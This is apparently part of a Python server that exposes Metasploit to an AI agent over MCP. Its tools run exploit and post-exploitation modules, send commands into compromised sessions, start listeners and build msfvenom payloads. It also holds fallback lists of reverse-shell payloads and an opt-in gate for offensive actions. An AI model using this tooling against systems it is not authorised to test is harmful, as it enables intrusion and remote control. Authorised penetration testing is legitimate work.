    # Defense-in-depth: the backend's generic manifest dispatcher (scan_worker.py) is the primary gate for every
    # exploitation-class tool, checked before this server is ever called — but this server itself never verified
    # the opt-in independently. Anything else reachable on the internal Docker network (or a compromised backend
    # process) could otherwise call these 6 actions directly with no check at all.
    _OFFENSIVE_TOOL_NAMES = {
        "generate_payload", "run_auxiliary_module", "run_exploit", "run_exploit_module",
        "run_post_module", "send_session_command", "start_listener",
    }
    if tool_name in _OFFENSIVE_TOOL_NAMES:
        from mcp_auth import offensive_action_allowed
        if not offensive_action_allowed():
            return {"error": f"'{tool_name}' is an exploitation-class action and requires SOCIS_AGENT_ALLOW_OFFENSIVE "
                              "to be enabled on the server (defense-in-depth check — the backend's own gate should "
                              "already have blocked this; seeing this error means this server was called directly)."}

    try:
        # Route tool calls to RPC methods
        if tool_name == "list_exploits":
            query = arguments.get("query", "")
            module_type = arguments.get("type", "exploit")
            limit = int(arguments.get("limit", 20))

            # module.search returns {"modules": [...]} where each entry has "type", "name", etc.
            result = await msf_rpc_call("module.search", [query])
            modules = result.get("modules", []) if isinstance(result, dict) else (result if isinstance(result, list) else [])

            # Filter by type if specified
            if module_type:
                modules = [m for m in modules if isinstance(m, dict) and m.get("type", "") == module_type]

            modules = modules[:limit]
            return {
                "query": query,
                "type": module_type,
                "results": modules,
                "count": len(modules),
            }
        
        elif tool_name == "list_all_exploits":
            platform = arguments.get("platform", "windows")
            limit = int(arguments.get("limit", 50))

            output = await msf_list_modules_via_console("exploit", limit)

            # Check for connection error
            if output.startswith("[ERROR]"):
                return {"error": output, "platform": platform, "results": [], "count": 0}

            module_paths = _parse_msf_module_list(output, module_prefix="exploit/")
            if platform and platform != "all":
                module_paths = [p for p in module_paths if platform.lower() in p.lower()]

            modules = [{"type": "exploit", "name": p} for p in module_paths[:limit]]

            # Fallback: module.search if console returned nothing
            if not modules:
                result = await msf_rpc_call("module.search", [platform])
                if isinstance(result, dict) and "error" not in result:
                    all_mods = result.get("modules", [])
                    modules = [m for m in all_mods if isinstance(m, dict) and m.get("type") == "exploit"][:limit]

            return {"platform": platform, "results": modules, "count": len(modules)}
        
        elif tool_name == "list_auxiliary_modules":
            category = arguments.get("category", "scanner")
            service = arguments.get("service", "http")
            limit = int(arguments.get("limit", 30))

            output = await msf_list_modules_via_console("auxiliary", limit)

            if output.startswith("[ERROR]"):
                return {"error": output, "category": category, "service": service, "results": [], "count": 0}

            module_paths = _parse_msf_module_list(output, module_prefix="auxiliary/")
            # Filter by category / service
            filtered = [
                p for p in module_paths
                if category.lower() in p.lower() or service.lower() in p.lower()
            ]
            modules = [{"type": "auxiliary", "name": p} for p in filtered[:limit]]

            return {
                "category": category, "service": service,
                "results": modules, "count": len(modules),
            }
        
        elif tool_name == "list_exploit_modules":
            category = arguments.get("category", "remote")
            platform = arguments.get("platform", "windows")
            limit = int(arguments.get("limit", 30))

            output = await msf_list_modules_via_console("exploit", limit)

            if output.startswith("[ERROR]"):
                return {"error": output, "category": category, "platform": platform, "results": [], "count": 0}

            module_paths = _parse_msf_module_list(output, module_prefix="exploit/")
            if platform and platform != "all":
                module_paths = [p for p in module_paths if platform.lower() in p.lower()]
            modules = [{"type": "exploit", "name": p} for p in module_paths[:limit]]

            if not modules:
                result = await msf_rpc_call("module.search", [platform])
                if isinstance(result, dict) and "error" not in result:
                    all_mods = result.get("modules", [])
                    modules = [m for m in all_mods if isinstance(m, dict) and m.get("type") == "exploit"][:limit]

            return {"category": category, "platform": platform, "results": modules, "count": len(modules)}
        
        elif tool_name == "list_post_modules":
            category = arguments.get("category", "gather")
            os_filter = arguments.get("os", "windows")
            limit = int(arguments.get("limit", 30))

            output = await msf_list_modules_via_console("post", limit)

            if output.startswith("[ERROR]"):
                return {"error": output, "category": category, "os": os_filter, "results": [], "count": 0}

            module_paths = _parse_msf_module_list(output, module_prefix="post/")
            filtered = [
                p for p in module_paths
                if category.lower() in p.lower() or os_filter.lower() in p.lower()
            ]
            modules = [{"type": "post", "name": p} for p in filtered[:limit]]

            return {"category": category, "os": os_filter, "results": modules, "count": len(modules)}
        
        elif tool_name == "list_payloads":
            query    = arguments.get("query", "")
            platform = arguments.get("platform", "")
            arch     = arguments.get("arch", "")
            limit    = int(arguments.get("limit", 20))

            output = await msf_list_modules_via_console("payloads", limit * 5)

            if output.startswith("[ERROR]"):
                return {"error": output, "results": [], "count": 0}

            module_paths = _parse_msf_module_list(output, module_prefix="payload/")

            payloads = []
            for name in module_paths:
                if query and query.lower() not in name.lower():
                    continue
                if platform and platform.lower() not in name.lower():
                    continue
                if arch and arch.lower() not in name.lower():
                    continue
                payloads.append({"name": name})
                if len(payloads) >= limit:
                    break

            return {"query": query, "platform": platform, "arch": arch, "results": payloads, "count": len(payloads)}

        elif tool_name == "get_module_info":
            module_path = arguments.get("module_path", "")
            parts = module_path.split("/", 1)
            module_type = parts[0] if len(parts) > 1 else "exploit"
            module_name = parts[1] if len(parts) > 1 else parts[0]
            result = await msf_rpc_call("module.info", [module_type, module_name])
            return result if isinstance(result, dict) else {"module": module_path, "info": result}
        
        elif tool_name == "run_post_module":
            module_path = arguments.get("module_path", "")
            session_id  = arguments.get("session_id")
            options     = arguments.get("options", {})

            if not session_id:
                return {"error": "session_id is required for post modules", "module": module_path}

            opts = {"SESSION": str(session_id), **options}
            parts = module_path.split("/", 1)
            module_type = parts[0]
            module_name = parts[1] if len(parts) > 1 else parts[0]

            output = await msf_run_via_console(module_type, module_name, opts, timeout=120)
            return {
                "output": output,
                "success": bool(output.strip()),
                "module": module_path,
                "session_id": session_id,
            }

        elif tool_name == "list_active_sessions":
            msf_result = await msf_rpc_call("session.list", [])
            stored_sessions = await get_stored_sessions()

            msf_sessions = msf_result if isinstance(msf_result, dict) and "error" not in msf_result else {}

            # Build a clean sessions summary for the UI card
            session_list = []
            for sid, sinfo in msf_sessions.items():
                if isinstance(sinfo, dict):
                    session_list.append({
                        "id": str(sid),
                        "type": sinfo.get("type", "unknown"),
                        "via_exploit": sinfo.get("via_exploit", ""),
                        "via_payload": sinfo.get("via_payload", ""),
                        "tunnel_peer": sinfo.get("tunnel_peer", ""),
                        "info": sinfo.get("info", ""),
                    })

            return {
                "metasploit": msf_sessions,
                "stored": stored_sessions,
                "count": len(msf_sessions) + len(stored_sessions),
                # Fields the UI card checks:
                "has_session": len(msf_sessions) > 0,
                "sessions_opened": [s["id"] for s in session_list],
                "msf_session_ids": [s["id"] for s in session_list],
                "mode": "list_sessions",
                "session_details": session_list,
                # output field so raw_output is parseable JSON for Terminal tab
                "output": json.dumps(session_list) if session_list else "",
            }
        
        elif tool_name == "run_auxiliary_module":
            # Accept both 'module_path' (MCP standard) and 'module' (from scan_worker)
            module_path = arguments.get("module_path") or arguments.get("module", "auxiliary/scanner/portscan/tcp")
            rhosts = arguments.get("rhosts")
            options = arguments.get("options", {})
            _check_msf_targets(rhosts)
            _check_msf_targets(options.get("RHOSTS") if isinstance(options, dict) else None)

            opts = {**options}
            if rhosts:
                opts["RHOSTS"] = rhosts

            # Split "auxiliary/scanner/portscan/tcp" → type="auxiliary", name="scanner/portscan/tcp"
            parts = module_path.split("/", 1)
            module_type = parts[0]
            module_name = parts[1] if len(parts) > 1 else parts[0]

            # Use console API to run and collect real output (module.execute is fire-and-forget)
            sessions_before_raw = await msf_rpc_call("session.list", [])
            sessions_before: set = (
                set(sessions_before_raw.keys())
                if isinstance(sessions_before_raw, dict) and "error" not in sessions_before_raw
                else set()
            )

            output = await msf_run_via_console(module_type, module_name, opts, timeout=120)

            sessions_after_raw = await msf_rpc_call("session.list", [])
            sessions_after: set = (
                set(sessions_after_raw.keys())
                if isinstance(sessions_after_raw, dict) and "error" not in sessions_after_raw
                else set()
            )
            new_session_ids = sessions_after - sessions_before

            has_session = bool(new_session_ids) or _msf_session_opened(output)

            real_msf_id = next(iter(new_session_ids), None)
            primary_msf_id = int(real_msf_id) if real_msf_id is not None else None
            redis_session_id = None
            if has_session:
                redis_session_id = await store_session({
                    "type": "auxiliary",
                    "module": module_path,
                    "rhosts": rhosts,
                    "target": rhosts,
                    "msf_session_id": str(real_msf_id) if real_msf_id is not None else None,
                    "output": output[:500],
                })

            return {
                "output": output,
                "success": bool(output.strip()),
                "module": module_path,
                "mode": "single-module",
                "target": rhosts or "",
                "has_session": has_session,
                "sessions_opened": [primary_msf_id] if primary_msf_id is not None else [],
                "exploited": has_session,
                "session_id": primary_msf_id,
                "redis_session_id": redis_session_id,
                "msf_session_ids": [str(s) for s in new_session_ids],
                "attempted_modules": 1,
                "successful_modules": 1 if bool(output.strip()) else 0,
            }

        elif tool_name in ("run_exploit", "run_exploit_module"):
            # Supports both the MCP tool name ("run_exploit") and the scan_worker name ("run_exploit_module")
            exploit_path = arguments.get("exploit_path") or arguments.get("module", "")
            target_host = arguments.get("target_host") or arguments.get("rhosts", "")
            _check_msf_targets(target_host)
            target_port = arguments.get("target_port")
            payload = arguments.get("payload")
            lhost = arguments.get("lhost")
            lport = arguments.get("lport")
            extra_opts = arguments.get("options", {}) or {}
            check_first = bool(arguments.get("check_first", False))

            opts: dict = {**extra_opts, "RHOSTS": target_host}
            if target_port:
                opts["RPORT"] = str(target_port)
            if lhost:
                opts["LHOST"] = lhost
            if lport:
                opts["LPORT"] = str(lport)

            # Collect any unrecognised top-level args (e.g. targeturi, username,
            # password, dbname) and pass them through as MSF datastore options.
            # The AI may pass module-specific options at the top level rather than
            # inside the `options` dict.
            _KNOWN_RUN_EXPLOIT_ARGS = {
                "exploit_path", "module", "target_host", "rhosts",
                "target_port", "payload", "lhost", "lport",
                "options", "check_first",
            }
            for _k, _v in arguments.items():
                if _k not in _KNOWN_RUN_EXPLOIT_ARGS and _v is not None:
                    opts[_k.upper()] = str(_v)

            parts = exploit_path.split("/", 1)
            module_type = parts[0]
            module_name = parts[1] if len(parts) > 1 else parts[0]

            payload_warning: str | None = None
            payload_used: str | None = payload

            if payload_used:
                opts["PAYLOAD"] = payload_used

            # Snapshot the session list BEFORE so we can diff after
            sessions_before_raw = await msf_rpc_call("session.list", [])
            sessions_before: set = (
                set(sessions_before_raw.keys())
                if isinstance(sessions_before_raw, dict) and "error" not in sessions_before_raw
                else set()
            )

            # Use background-job mode so the handler outlives the exploit component.
            # 'Failure executing payload' fires when MSF's HTTP request to trigger the PHP
            # times out (because PHP blocks on the netcat connection), but the netcat on
            # the target may still be connecting. exploit -j keeps the handler alive for
            # the full timeout so delayed connections are caught.

            # ── Optional check before exploit ──────────────────────────────
            check_output: str = ""
            if check_first:
                check_output = await _msf_check_module(module_type, module_name, opts)
                # If the check explicitly says not vulnerable, skip the exploit
                if "is not vulnerable" in check_output.lower() or "cannot reliably check" not in check_output.lower() and "not vulnerable" in check_output.lower():
                    # Let it through anyway — check results are unreliable for many modules
                    pass

            output = await msf_run_exploit_job(
                module_type, module_name, opts, timeout=180,
                sessions_before=sessions_before,
            )
            if check_output:
                output = f"[CHECK OUTPUT]\n{check_output}\n[EXPLOIT OUTPUT]\n{output}"

            # ── Auto-retry with compatible payload ──────────────────────────
            # If MSF rejected the payload, detect it in the output and
            # automatically pick a working payload, then re-run.
            if payload and "value specified for payload is not valid" in output.lower():
                # Query MSF for the real compatible payload list
                compat_result = await msf_rpc_call(
                    "module.compatible_payloads", [module_type, module_name]
                )
                compat_payloads: list[str] = (
                    compat_result.get("payloads", [])
                    if isinstance(compat_result, dict) and "error" not in compat_result
                    else []
                )

                # Path-based fallback when the RPC list is empty
                if not compat_payloads:
                    ep = exploit_path.lower()
                    if "/unix/" in ep or "/ftp/" in ep or "/linux/local" in ep:
                        compat_payloads = [
                            "cmd/unix/reverse_netcat",
                            "cmd/unix/reverse_bash",
                            "cmd/unix/reverse_perl",
                            "cmd/unix/reverse_python",
                        ]
                    elif "/linux/" in ep:
                        compat_payloads = [
                            "linux/x86/shell_reverse_tcp",
                            "linux/x64/shell_reverse_tcp",
                            "cmd/unix/reverse_netcat",
                        ]
                    elif "/windows/" in ep:
                        compat_payloads = [
                            "windows/meterpreter/reverse_tcp",
                            "windows/shell/reverse_tcp",
                        ]
                    elif "/multi/" in ep or "/php/" in ep or "/java/" in ep:
                        compat_payloads = [
                            "generic/shell_reverse_tcp",
                            "cmd/unix/reverse_netcat",
                        ]
                    else:
                        compat_payloads = [
                            "cmd/unix/reverse_netcat",
                            "generic/shell_reverse_tcp",
                        ]

                _FALLBACK_PREF = [
                    "cmd/unix/reverse_netcat",
                    "cmd/unix/reverse_bash",
                    "cmd/unix/reverse_perl",
                    "cmd/unix/reverse_python",
                    "linux/x86/shell_reverse_tcp",
                    "linux/x64/shell_reverse_tcp",
                    "windows/meterpreter/reverse_tcp",
                    "windows/shell/reverse_tcp",
                    "generic/shell_reverse_tcp",
                ]
                chosen = next(
                    (fb for fb in _FALLBACK_PREF if fb in compat_payloads),
                    compat_payloads[0] if compat_payloads else None,
                )

                if chosen and chosen != payload:
                    payload_warning = (
                        f"Payload '{payload}' is incompatible with {exploit_path} — "
                        f"MSF error: 'The value specified for PAYLOAD is not valid'. "
                        f"Auto-retrying with '{chosen}'."
                    )
                    payload_used = chosen
                    opts["PAYLOAD"] = chosen
                    output = await msf_run_exploit_job(
                        module_type, module_name, opts, timeout=180,
                        sessions_before=sessions_before,
                    )

            # Snapshot the session list AFTER — new keys = newly opened sessions
            sessions_after_raw = await msf_rpc_call("session.list", [])
            sessions_after: set = (
                set(sessions_after_raw.keys())
                if isinstance(sessions_after_raw, dict) and "error" not in sessions_after_raw
                else set()
            )
            new_session_ids = sessions_after - sessions_before

            # If nothing yet, wait 10 s and check one more time — background handlers
            # may establish the session just after the console output finishes.
            if not new_session_ids and not _msf_session_opened(output):
                await asyncio.sleep(10)
                sessions_late_raw = await msf_rpc_call("session.list", [])
                sessions_late: set = (
                    set(sessions_late_raw.keys())
                    if isinstance(sessions_late_raw, dict) and "error" not in sessions_late_raw
                    else set()
                )
                new_session_ids = sessions_late - sessions_before

            # has_session = new sessions in RPC list  OR  regex match in output
            has_session = bool(new_session_ids) or _msf_session_opened(output)

            real_msf_id = next(iter(new_session_ids), None)
            # Use the actual MSF integer ID as session_id so callers can pass it
            # directly to send_session_command without further translation.
            primary_msf_id = int(real_msf_id) if real_msf_id is not None else None
            redis_session_id = None
            if has_session:
                redis_session_id = await store_session({
                    "type": "exploit",
                    "module": exploit_path,
                    "target": target_host,
                    "payload": payload,
                    "msf_session_id": str(real_msf_id) if real_msf_id is not None else None,
                    "output": output[:500],
                })

            return {
                "output": output,
                "success": has_session or bool(output.strip()),
                "module": exploit_path,
                "payload_requested": payload,
                "payload_used": payload_used,
                "payload_warning": payload_warning,
                "mode": "single-module",
                "target": target_host,
                "has_session": has_session,
                "sessions_opened": [primary_msf_id] if primary_msf_id is not None else [],
                "exploited": has_session,
                "session_id": primary_msf_id,
                "redis_session_id": redis_session_id,
                "msf_session_ids": [str(s) for s in new_session_ids],
                "attempted_modules": 1,
                "successful_modules": 1 if has_session else 0,
            }
        
        elif tool_name == "send_session_command":
            session_id = _coerce_session_id(arguments.get("session_id"))
            command = str(arguments.get("command", "")).strip()

            if session_id is None:
                return {"error": "valid session_id parameter is required"}
            if not command:
                return {"error": "command parameter is required", "session": session_id}

            wait_ms = int(arguments.get("wait_ms", 900) or 900)
            max_reads = int(arguments.get("max_reads", 4) or 4)
            wait_ms = max(0, min(wait_ms, 10_000))
            max_reads = max(1, min(max_reads, 20))

            session_type = await _get_session_type(session_id)
            if not session_type:
                return {
                    "error": "Session not found",
                    "session": session_id,
                    "command": command,
                }

            # Flush stale output first so we return only fresh output for this command.
            if session_type == "meterpreter":
                await msf_rpc_call("session.meterpreter_read", [session_id])
                run_res = await msf_rpc_call("session.meterpreter_run_single", [session_id, command])
                if isinstance(run_res, dict) and run_res.get("error"):
                    await msf_rpc_call("session.meterpreter_write", [session_id, str(command) + "\n"])
                read_method = "session.meterpreter_read"
                read_args = [session_id]
            else:
                await msf_rpc_call("session.shell_read", [session_id, -1])
                await msf_rpc_call("session.shell_write", [session_id, str(command) + "\n"])
                read_method = "session.shell_read"
                read_args = [session_id, -1]

            if wait_ms > 0:
                await asyncio.sleep(wait_ms / 1000.0)

            output_chunks: list[str] = []
            for _ in range(max_reads):
                read_res = await msf_rpc_call(read_method, read_args)
                if isinstance(read_res, dict):
                    chunk = str(read_res.get("data", "") or "")
                else:
                    chunk = str(read_res or "")
                if chunk:
                    output_chunks.append(chunk)
                else:
                    # One empty read indicates buffer drained.
                    break
                await asyncio.sleep(0.2)

            output = "".join(output_chunks).strip()
            return {
                "session": session_id,
                "session_id": session_id,          # also as session_id for consistency
                "session_type": session_type,
                "command": command,
                "output": output,
                "success": True,
                # Fields the UI card checks — command ran = session is alive
                "has_session": True,
                "sessions_opened": [session_id],
                "msf_session_ids": [str(session_id)],
                "mode": "send_command",
            }
        
        elif tool_name == "terminate_session":
            session_id = _coerce_session_id(arguments.get("session_id"))
            if session_id is None:
                return {"error": "valid session_id is required"}
            msf_result = await msf_rpc_call("session.stop", [session_id])
            await remove_session(str(session_id))
            return {"terminated": session_id, "status": msf_result, "removed_from_storage": True}
        
        elif tool_name == "list_listeners":
            jobs_result = await msf_rpc_call("job.list", [])
            sessions_result = await msf_rpc_call("session.list", [])

            jobs = jobs_result if isinstance(jobs_result, dict) and "error" not in jobs_result else {}
            sessions = sessions_result if isinstance(sessions_result, dict) and "error" not in sessions_result else {}

            # Format jobs — filter to only handler/multi/handler entries
            active_handlers = {
                jid: jname for jid, jname in jobs.items()
                if isinstance(jname, str)
            }
            # Format sessions
            active_sessions = {}
            for sid, sinfo in sessions.items():
                if isinstance(sinfo, dict):
                    active_sessions[str(sid)] = {
                        "type": sinfo.get("type", "unknown"),
                        "via_exploit": sinfo.get("via_exploit", ""),
                        "via_payload": sinfo.get("via_payload", ""),
                        "tunnel_peer": sinfo.get("tunnel_peer", ""),
                        "info": sinfo.get("info", ""),
                    }

            session_ids = list(active_sessions.keys())
            return {
                "jobs": active_handlers,
                "job_count": len(active_handlers),
                "sessions": active_sessions,
                "session_count": len(active_sessions),
                "has_session": len(active_sessions) > 0,
                "sessions_opened": session_ids,
                "msf_session_ids": session_ids,
                "mode": "list_listeners",
                "output": "",
            }
        
        elif tool_name == "start_listener":
            payload = arguments.get("payload")
            lhost = arguments.get("lhost")
            lport = arguments.get("lport")
            
            opts = {
                "PAYLOAD": payload,
                "LHOST": lhost,
                "LPORT": str(lport)
            }
            # module.execute requires 3 args: (module_type, module_name, datastore)
            result = await msf_rpc_call("module.execute", ["exploit", "multi/handler", opts])
            return result if isinstance(result, dict) else {"listener": "started"}
        
        elif tool_name == "generate_payload":
            payload  = arguments.get("payload", "windows/meterpreter/reverse_tcp")
            fmt      = arguments.get("format", "exe")
            lhost    = arguments.get("lhost", "")
            lport    = str(arguments.get("lport", 4444))
            options  = arguments.get("options", {})

            os.makedirs(PAYLOAD_SAVE_DIR, exist_ok=True)
            safe_name = payload.replace("/", "_")
            filename  = f"{safe_name}.{fmt}"
            save_path = os.path.join(PAYLOAD_SAVE_DIR, filename)

            # Build msfvenom command — most reliable way to generate payloads
            cmd: list[str] = ["msfvenom", "-p", payload, "-f", fmt, "-o", save_path]
            if lhost:
                cmd.append(f"LHOST={lhost}")
            if lport:
                cmd.append(f"LPORT={lport}")
            for k, v in options.items():
                cmd.append(f"{k}={v}")

            try:
                proc = await asyncio.create_subprocess_exec(
                    *cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=120)
                output = (stdout + stderr).decode("utf-8", errors="replace").strip()
                success = proc.returncode == 0
            except FileNotFoundError:
                return {"error": "msfvenom not found — is Metasploit installed?", "payload": payload}
            except asyncio.TimeoutError:
                return {"error": "msfvenom timed out after 120s", "payload": payload}

            return {
                "payload": payload,
                "format": fmt,
                "lhost": lhost,
                "lport": lport,
                "saved_path": save_path if success else None,
                "output": output,
                "success": success,
            }

        elif tool_name == "stop_job":
            job_id = arguments.get("job_id")
            result = await msf_rpc_call("job.stop", [job_id])
            return {"job_id": job_id, "stopped": result}
        
        else:
            return {"error": f"Unknown tool: {tool_name}"}
            
    except Exception as e:
        logger.error(f"Tool error: {str(e)}")
        return {
            "error": str(e),
            "tool": tool_name,
            "arguments": arguments
        }


def make_response(req_id: Any, result: Any) -> Dict:
    """Format JSON-RPC response."""
    return {"jsonrpc": "2.0", "id": req_id, "result": result}


def make_error(req_id: Any, code: int, message: str) -> Dict:
    """Format JSON-RPC error response."""
    return {"jsonrpc": "2.0", "id": req_id, "error": {"code": code, "message": message}}


# ─── FastAPI Endpoints ─────────────────────────────────────────────────

@app.post("/mcp")
async def mcp_handler(request: Request):
    """Handle JSON-RPC 2.0 MCP protocol requests."""
    if not verify_mcp_auth(request):
        return mcp_auth_error()
    try:
        payload = await request.json()
        req_id = payload.get("id")
        method = payload.get("method")
        params = payload.get("params", {})
        
        logger.debug(f"MCP request: {method}")
        
        if method == "tools/list":
            result = {"tools": TOOLS}
            return JSONResponse(make_response(req_id, result))
            
        elif method == "tools/call":
            tool_name = params.get("name")
            arguments = params.get("arguments", {})
            
            result = await handle_tool(tool_name, arguments)
            return JSONResponse(make_response(
                req_id,
                {"content": [{"type": "text", "text": json.dumps(result, indent=2)}]}
            ))
            
        elif method == "initialize":
            return JSONResponse(make_response(req_id, {
                "protocolVersion": "2024-11-05",
                "capabilities": {"tools": {}},
                "serverInfo": {
                    "name": SERVER_NAME,
                    "version": MCP_VERSION
                }
            }))
            
        else:
            return JSONResponse(
                make_error(req_id, -32601, f"Method not found: {method}"),
                status_code=404
            )
            
    except json.JSONDecodeError as e:
        return JSONResponse(
            make_error(None, -32700, f"Parse error: {str(e)}"),
            status_code=400
        )
    except Exception as e:
        logger.error(f"Handler error: {str(e)}")
        return JSONResponse(
            make_error(None, -32603, str(e)),
            status_code=500
        )


@app.get("/health")
async def health():
    """Health check endpoint."""
    return {
        "status": "healthy",
        "server": SERVER_NAME,
        "configured": bool(MSF_PASSWORD),
        "rpc_host": MSF_HOST,
        "rpc_port": MSF_PORT
    }


if __name__ == "__main__":
    logger.info(f"Starting Metasploit MCP Server on port 8104")
    logger.info(f"RPC endpoint: {METASPLOIT_URL}")
    
    if not MSF_PASSWORD:
        logger.error("⚠️  ERROR: MSF_PASSWORD environment variable not set!")
        logger.error("Please set it before running: export MSF_PASSWORD=<your_password>")
    
    uvicorn.run(app, host="0.0.0.0", port=8104, log_level="info")
